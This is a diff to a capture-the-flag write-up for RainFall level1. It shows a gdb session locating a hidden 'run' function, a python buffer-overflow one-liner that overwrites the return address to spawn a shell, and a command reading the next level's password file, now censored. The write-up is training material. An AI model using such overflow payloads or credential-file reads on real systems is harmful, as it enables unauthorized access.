@@ -14,19 +14,18 @@ And we use `cat` to keep the shell open.
 
 ```shell
 level1@RainFall:~$ gdb ./level1
-[…]
+[...]
 Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
 (gdb) info functions
 All defined functions:
 Non-debugging symbols:
-[…]
+[...]
 0x08048444  run
 0x08048480  main
-[…]
+[...]
 (gdb) quit
 level1@RainFall:~$ (python -c ‘import struct; print “A”*76 + struct.pack(“<Q”, 0x08048444)‘; cat -) | ./level1
 Good... Wait what?
 cat /home/user/level2/.pass
-[…]
-``` 
-f
+[censored]
+```
